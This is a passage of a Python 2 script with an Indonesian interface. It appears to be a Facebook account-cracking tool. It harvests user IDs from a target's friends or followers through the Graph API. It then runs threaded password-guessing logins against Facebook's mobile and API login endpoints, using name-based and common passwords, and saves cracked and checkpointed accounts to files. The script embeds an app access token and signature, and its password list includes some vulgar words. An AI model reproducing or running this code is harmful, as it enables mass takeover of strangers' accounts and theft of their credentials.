                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'json', 'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\x1b[0;92m[OK] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print '\r\x1b[0;93m[CP] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Selesai'
    exit()
def menumbasic():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print '[!] Tidak Ada Koneksi!'
        sys.exit()
    print logo
    print '' + p + ''
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[\xc3\x97]\x1b[1;92m Methode Mbasic'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] Bergabung    : ' + p + '' + durasi
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] Premium      : ' + M + 'Belum Ada Keterangan'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + '[+] IP Anda      : ' + p + '' + ip
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print '' + p + ''
    print '[ Hello \x1b[1;92m' + nama + '\x1b[0;97m ]'
    print '' + p + ''
    print '[1]. Crack Dari Publik Teman'
    print '[2]. Crack Dari Total Followers'
    print '[3]. Lihat Hasil Crack'
    print '[' + m + '0' + p + ']. Keluar (Hapus Token)'
    pilih_menumbasic()
def pilih_menumbasic():
    ask = raw_input('\n[?] Pilih : ')
    if ask == '':
        print '[!] Pilih Yang Benar Ganz/Canz :('
        exit()
    elif ask == '01' or ask == '1':
        print "\n[+] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia/Tidak Ditemukan'
            exit()
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif ask == '02' or ask == '2':
        print "\n[+] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print '[+] Nama : ' + sp['name']
        except KeyError:
            print '[!] ID Tidak Tersedia/Tidak Ditemukan'
            exit()
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif ask == '03' or ask == '3':
        print '\n[1] Hasil OK '
        print '[2] Hasil CP '
        ress = raw_input('\n[?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
            print '\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '02' or ress == '2':
            print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
            print '[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Benar Ganz/Canz :(')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print '[!] Berhasil Menghapus Token'
        print 'Terimakasih Telah Terhubung Tools Saya'
        exit()
    else:
        print '[!] Pilih Yang Benar Ganz/Canz :('
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()
    print '[+] Total ID : ' + str(len(id))
    print '[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print '[\xc3\x97]\x1b[0;92m Jangan Lupa Follow Github Author\x1b[0;97m'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print ''
    def main(arg):
        global loop
        print '\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia', 'freefire', 'akucintakamu', 'bangsat', 'bangsatkau', 'kontolmu', 'kontolkuda']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[0;92m[OK] ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r\x1b[0;93m[CP] ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Selesai'
    exit()
def manualmbasic():
    print '\n[+] Buat Password Contoh : sayang, rahasia'
    pw = raw_input('[?] Buat Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print '[+] Total ID : ' + str(len(id))
    print '[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print '[\xc3\x97]\x1b[0;92m Jangan Lupa Follow Github Author\x1b[0;97m'
    print '\x1b[1;94m\xe2\x94\x9c\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xef\xbf\xbd\xef\xbf\xbd\xe2\x94\xa4'
    print ''
    def main(arg):
        global loop
        print '\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[0;92m[Ok] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print '\r\x1b[0;93m[CP] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print '\n[+] Selesai'
    exit()
if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
# Mau Ngapain Cuk?